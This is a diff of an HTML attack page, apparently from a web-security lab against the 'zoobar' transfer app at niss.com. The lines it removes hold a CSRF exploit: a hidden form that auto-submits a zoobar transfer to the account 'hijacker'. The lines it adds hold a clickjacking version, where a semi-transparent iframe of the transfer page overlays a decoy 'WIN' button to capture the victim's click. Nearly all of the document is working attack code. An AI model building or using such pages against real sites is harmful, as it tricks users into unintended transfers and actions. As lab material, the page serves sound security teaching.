@@ -1,53 +1,39 @@
 <!DOCTYPE html>
+
+<!--一自动向 web/transfer.php 提交包含 zoobars, recipient 表单的方式，实现 csrf 攻击-->
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>hijack</title>
+    <title>hijack-demo</title>
+    <style>
+        iframe {
+            width: 1440px;
+            height: 900px;
+            position: absolute;
+            /*top: -0px;*/
+            /*left: -0px;*/
+            z-index: 2;
+            opacity: 0.5;
+            /*display: none;*/
+        }
+
+        /*将按钮覆盖至提交按钮上*/
+        #submit {
+            position: absolute;
+            top: 255px;
+            left: 635px;
+            /*在iframe提交按钮的之下*/
+            z-index: 1;
+        }
+    </style>
 </head>
-
-<style>
-    iframe {
-        width: 1440px;
-        height: 900px;
-        position: absolute;
-        top: -0px;
-        left: -0px;
-        z-index: 2;
-        opacity: 0.5;
-    }
-
-    #hijacker {
-        position: absolute;
-        top: 294px;
-        left: 584px;
-        z-index: 1;
-    }
-</style>
-
 <body>
-<iframe name="it" src="https://niss.com/transfer.php" ></iframe>
 
-<form method="POST"
-      name="transfer-form"
-      action="https://niss.com/transfer.php"
-      target="it"
-      id="transfer-form"
-      style="display:none">
-
-    <input name="zoobars" type="text" value="1" size="5">
-    <input name="recipient" type="text" value="hijacker">
-    <input type="hidden" name="submission" value="Send">
-</form>
+<iframe name="it" src="https://niss.com/transfer.php"></iframe>
 
 <form>
-    <input type="submit" id="hijacker" value="WIN">
+    <input type="submit" id="submit" value="WIN">
 </form>
-
-<script type="text/javascript">
-    form = document.getElementById("transfer-form");
-    form.submit();
-</script>
-
 
 </body>
 </html>
